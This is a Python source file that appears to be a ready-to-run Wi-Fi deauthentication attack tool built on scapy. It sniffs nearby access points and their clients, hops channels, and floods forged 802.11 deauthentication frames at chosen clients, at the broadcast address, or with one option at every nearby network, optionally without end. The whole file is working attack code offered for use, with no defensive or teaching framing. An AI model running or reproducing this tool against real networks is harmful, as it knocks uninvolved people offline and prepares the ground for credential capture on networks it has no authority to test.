#! /usr/bin/env python3

from os import geteuid, system
from scapy.all import *
from datetime import date
from optparse import OptionParser
from colorama import Fore, Back, Style
from time import strftime, localtime, sleep
from threading import Thread, Lock
from multiprocessing import Pool, cpu_count

status_color = {
    '+': Fore.GREEN,
    '-': Fore.RED,
    '*': Fore.YELLOW,
    ':': Fore.CYAN,
    ' ': Fore.WHITE
}

deauth_frame_set_count = 10
send_interval_delay = 0.1
access_points = {}
associations = []
packet_sent_loops = 10
broadcast_mac = "ff:ff:ff:ff:ff:ff"
started_sniffing = False
channel_hopping_delay = 0.5

lock = Lock()
thread_count = cpu_count()

def display(status, data, start='', end='\n'):
    print(f"{start}{status_color[status]}[{status}] {Fore.BLUE}[{date.today()} {strftime('%H:%M:%S', localtime())}] {status_color[status]}{Style.BRIGHT}{data}{Fore.RESET}{Style.RESET_ALL}", end=end)

def get_arguments(*args):
    parser = OptionParser()
    for arg in args:
        parser.add_option(arg[0], arg[1], dest=arg[2], help=arg[3])
    return parser.parse_args()[0]

def check_root():
    return geteuid() == 0

def process_packet(packet):
    if packet.haslayer(Dot11Beacon):
        bssid = packet[Dot11].addr2
        network_stats = packet[Dot11Beacon].network_stats()
        channel = network_stats["channel"]
        with lock:
            access_points[bssid] = {"channel" : channel}
    elif packet.haslayer(Dot11ProbeResp):
        try:
            bssid = packet[Dot11].addr2
        except:
            bssid = broadcast_mac
        try:
            recv_addr = packet[Dot11].addr1
        except:
            recv_addr = broadcast_mac
        with lock:
            if recv_addr != broadcast_mac and bssid != broadcast_mac and type(recv_addr) == str and type(bssid) == str:
                if [bssid, recv_addr] not in associations:
                    associations.append([bssid, recv_addr])
                if [recv_addr, bssid] not in associations:
                    associations.append([recv_addr, bssid])
    elif packet.haslayer(Dot11):
        try:
            bssid = packet[Dot11].addr2
        except:
            bssid = broadcast_mac
        try:
            recv_addr = packet[Dot11].addr1
        except:
            recv_addr = broadcast_mac
        with lock:
            if recv_addr != broadcast_mac and bssid != broadcast_mac and type(recv_addr) == str and type(bssid) == str:
                if [bssid, recv_addr] not in associations:
                    associations.append([bssid, recv_addr])
                if [recv_addr, bssid] not in associations:
                    associations.append([recv_addr, bssid])
def changeChannel(interface, channel):
    system(f"iwconfig {interface} channel {channel}")
def sendDeauthenticationFrame(ssid, client, iface, count, interval):
    dot11 = Dot11(type=0, subtype=12, addr1=client, addr2=ssid, addr3=ssid)
    deauthentication_layer = Dot11Deauth(reason=7)
    packet = RadioTap() / dot11 / deauthentication_layer
    sendp(packet, iface=iface, count=count, inter=interval, verbose=False)
def sendDeauthenticationFrameHandler(divisions, interface, count, delay):
    for division in divisions:
        ap_bssid = division[0]
        client = division[1]
        sendDeauthenticationFrame(ap_bssid, client, interface, count, delay)
def hop_channels(interface, delay, loops=1):
    channels = list(range(1, 15))
    for _ in range(loops):
        for channel in channels:
            system(f"iwconfig {interface} channel {channel}")
            sleep(delay)

if __name__ == "__main__":
    arguments = get_arguments(('-i', "--interface", "interface", "Network Interface to Start Sniffing on"),
                              ('-A', "--all", "all", "Deauth All Clients nearby (broadcast/individual)"),
                              ('-s', "--ssid", "ssid", "SSID for Access Point"),
                              ('-c', "--client", "client", "SSIDs for Clients (Seperated by ',')"),
                              ('-L', "--load", "load", "Load SSIDs for Access Points and their Clients from File (AP SSID,Client SSID,Channel)"),
                              ('-C', "--channel", "channel", "Channel to send Deauthentication Frames to (Would help if TBTT (Target Beacon Transmit Time) is large)"),
                              ('-f', "--count", "count", f"Count of Deauthentication frames to send in each set (Default={deauth_frame_set_count})"),
                              ('-d', "--delay", "delay", f"Interval for sending Deauthentication Frames (Default={send_interval_delay} seconds)"),
                              ('-D', "--hopping-delay", "hopping_delay", f"Channel Hopping Delay (Default={channel_hopping_delay} seconds)"),
                              ('-l', "--loop", "loop", f"Number of Times to Loop the sending of Deauthentication Frames (0 if Indefinitely, Default={packet_sent_loops})"))
    if not check_root():
        display('-', f"This Program requires {Back.YELLOW}root{Back.RESET} Privileges")
        exit(0)
    if not arguments.interface or arguments.interface not in get_if_list():
        display('-', "Please specify a Valid Interface")
        display('*', f"Available Interfaces : {Back.MAGENTA}{','.join(get_if_list())}{Back.RESET}")
        exit(0)
    deauth_details = {}
    if arguments.count:
        arguments.count = int(arguments.count)
    else:
        arguments.count = deauth_frame_set_count
    if arguments.delay:
        arguments.delay = float(arguments.delay)
    else:
        arguments.delay = send_interval_delay
    if arguments.hopping_delay:
        arguments.hopping_delay = float(arguments.hopping_delay)
    else:
        arguments.hopping_delay = channel_hopping_delay
    if arguments.loop:
        arguments.loop = int(arguments.loop)
    else:
        arguments.loop = packet_sent_loops
    if arguments.load:
        try:
            with open(arguments.load, 'r') as file:
                details = [line.split(',') for line in file.read().split('\n') if line != '']
            for ssid, client, channel in details:
                if channel not in deauth_details.keys():
                    deauth_details[channel] = {}
                if ssid not in deauth_details[channel].keys():
                    deauth_details[channel][ssid] = []
                deauth_details[channel][ssid].append(client)
        except FileNotFoundError:
            display('-', f"File {Back.YELLOW}{arguments.load}{Back.RESET} Not Found!")
            exit(0)
        except Exception as error:
            display('-', f"Error Occured => {Back.YELLOW}{error}{Back.RESET}")
            exit(0)
    elif not arguments.all:
        if not arguments.ssid:
            display('-', "Please Enter a SSID for the Target Access Point!")
            exit(0)
        if not arguments.client:
            display('*', "No Client Provided!")
            display(':', "Using Broadcast Address")
            arguments.client = [broadcast_mac]
        else:
            arguments.client = arguments.client.split(',')
        if not arguments.channel:
            Thread(target=sniff, kwargs={"iface": arguments.interface, "prn": process_packet, "store": False}, daemon=True).start()
            started_sniffing = True
            display('*', "Channel not Provided!")
            display(':', f"Waiting for Beacon Frame for SSID => {Back.MAGENTA}{arguments.ssid}{Back.RESET}")
            while True:
                with lock:
                    if arguments.ssid in access_points.keys():
                        arguments.channel = access_points[arguments.ssid]["channel"]
                        break
        deauth_details[arguments.channel] = {arguments.ssid: [client for client in arguments.client]}
    else:
        Thread(target=sniff, kwargs={"iface": arguments.interface, "prn": process_packet}, daemon=True).start()
        started_sniffing = True
    channel_wise_divisions = {}
    if not arguments.all:
        print(f"{Fore.CYAN}AP BSSID         \tCLIENT BSSID         \tCHANNEL{Fore.RESET}")
        for channel, details in deauth_details.items():
            total_essid_pairs = []
            for ap_bssid, clients in details.items():
                print('\n'.join([f"{Fore.GREEN}{ap_bssid}\t{client}\t{channel}{Fore.RESET}" for client in clients]))
                total_essid_pairs.extend([[ap_bssid, client] for client in clients])
            total_pairs = len(total_essid_pairs)
            current_division = [total_essid_pairs[group*total_pairs//thread_count: (group+1)*total_pairs//thread_count] for group in range(thread_count)]
            channel_wise_divisions[channel] = current_division
    else:
        display(':', f"Hopping Channels...")
        hop_channels(arguments.interface, arguments.hopping_delay, 2)
    loop_count = 0
    while True:
        if arguments.all:
            hop_channels(arguments.interface, arguments.hopping_delay)
            deauth_details = {}
            with lock:
                if arguments.all == "broadcast":
                    for ap_ssid, channel in access_points.items():
                        if channel["channel"] not in deauth_details.items():
                            deauth_details[channel["channel"]] = {}
                        deauth_details[channel["channel"]][ap_ssid] = [broadcast_mac]
                    for channel, details in deauth_details.items():
                        total_essid_pairs = []
                        for ap_bssid, clients in details.items():
                            total_essid_pairs.extend([[ap_bssid, client] for client in clients])
                        total_pairs = len(total_essid_pairs)
                        current_division = [total_essid_pairs[group*total_pairs//thread_count: (group+1)*total_pairs//thread_count] for group in range(thread_count)]
                        channel_wise_divisions[channel] = current_division
                else:
                    for ap_ssid, channel in access_points.items():
                        if channel["channel"] not in deauth_details.items():
                            deauth_details[channel["channel"]] = {}
                        deauth_details[channel["channel"]][ap_ssid] = []
                        for station_1, station_2 in associations:
                            if station_2 == ap_ssid:
                                deauth_details[channel["channel"]][ap_ssid].append(station_1)
                            elif station_1 == ap_ssid:
                                deauth_details[channel["channel"]][ap_ssid].append(station_2)
                    for channel, details in deauth_details.items():
                        total_essid_pairs = []
                        for ap_bssid, clients in details.items():
                            total_essid_pairs.extend([[ap_bssid, client] for client in clients])
                        total_pairs = len(total_essid_pairs)
                        current_division = [total_essid_pairs[group*total_pairs//thread_count: (group+1)*total_pairs//thread_count] for group in range(thread_count)]
                        channel_wise_divisions[channel] = current_division
        for channel, channel_wise_division in channel_wise_divisions.items():
            display('+', f"Changing Channel of {Back.MAGENTA}{arguments.interface}{Back.RESET} to {Back.MAGENTA}{channel}{Back.RESET}")
            changeChannel(arguments.interface, channel)
            pool = Pool(thread_count)
            threads = []
            for division in channel_wise_division:
                if division != []:
                    threads.append(pool.apply_async(sendDeauthenticationFrameHandler, (division, arguments.interface, arguments.count, arguments.delay)))
            for thread in threads:
                thread.get()
            pool.close()
            pool.join()
        loop_count += 1
        if loop_count >= arguments.loop and arguments.loop != 0:
            break